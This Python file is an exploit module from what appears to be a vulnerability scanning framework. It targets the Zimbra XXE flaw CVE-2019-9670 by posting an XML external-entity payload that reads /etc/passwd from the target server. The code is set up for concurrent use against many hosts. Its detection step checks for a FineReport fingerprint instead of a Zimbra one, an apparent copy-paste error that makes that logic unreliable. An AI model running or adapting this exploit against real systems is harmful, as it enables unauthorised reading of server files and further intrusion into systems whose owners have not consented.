# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-09 2:18
import socket
from _ssl import SSLCertVerificationError

from async_timeout import timeout
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


class Script(BaseScript):
    name = 'zimbra'

    def __init__(self, target, pbar, semaphore):
        super().__init__()
        self.bugNumber = 'CVE-2019-9670'
        self.target = target
        self.type = BugType.XXE
        self.level = BugLevel.HIGH
        self.semaphore = semaphore
        self.bugRefer = 'http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce'
        self.info = 'Version: <= 8.7.0 and 8.7.11'
        self.pbar = pbar
        self.detectPathList = ['/']
        self.execPathList = ['/Autodiscover/Autodiscover.xml']

    async def detect(self):
        try:
            async with self.semaphore:
                async with aiohttp.ClientSession(headers=self.headers) as session:
                    for detectPath in self.detectPathList:
                        url = f'http://{self.target}{detectPath}' if self.target.startswith(
                            ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                        text = await AsyncFetcher.fetch(session=session, url=url)
                        if 'FineReport--Web Reporting Tool' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('Zimbra Finger', url))
                            return {'name': 'Zimbra Finger', 'url': url, 'software': 'Zimbra'}
        except Exception:
            return None

    async def exec(self):
        try:
            async with self.semaphore:
                async with aiohttp.ClientSession() as session:
                    for execPath in self.execPathList:
                        url = f'http://{self.target}{execPath}' if self.target.startswith(
                            ('http:', 'https:')) is False else f'{self.target}{execPath}'
                        data = '''<!DOCTYPE xxe [
                            <!ELEMENT name ANY >
                            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                             <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
                                <Request>
                                  <EMailAddress>aaaaa</EMailAddress>
                                  <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
                                </Request>
                              </Autodiscover>'''
                        async with session.post(url=url, data=data) as res:
                            if res is not None:
                                text = await res.text()
                                if 'Error 503 Requested response schema not available' in text:
                                    tqdm.write(Fore.RED + '[{}] {}'.format('FineReport', url))
                                    return {'name': 'Zimbra XXE', 'url': url, 'software': 'Zimbra'}
        except Exception:
            return None

    async def attack(self):
        a = await self.detect()
        if a is not None:
            self.vulList.append(a)
        if self.flag:
            b = await self.exec()
            if b is not None:
                self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    sem = asyncio.Semaphore(500)
    sc = Script('192.168.4.137:8983', 1, sem)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack())
